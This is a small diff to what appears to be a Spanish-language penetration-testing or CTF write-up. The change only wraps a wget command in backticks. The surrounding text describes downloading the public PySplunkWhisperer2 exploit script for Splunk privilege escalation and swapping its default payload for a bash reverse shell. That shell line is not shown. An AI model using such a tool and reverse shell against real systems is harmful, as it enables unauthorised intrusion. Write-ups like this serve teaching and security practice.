@@ -93,7 +93,7 @@ Buscando en internet por “splunk privilege escalation” encuentro esto:
 
 Me descargo la versión python para ejecución remota de esta forma:
 
-wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py
+`wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py`
 
 Viendo la página del proyecto observo que por defecto se ejecuta un calc.exe como payload. Lo cambio por una reverse shell en bash de pentestmonkey así:
 
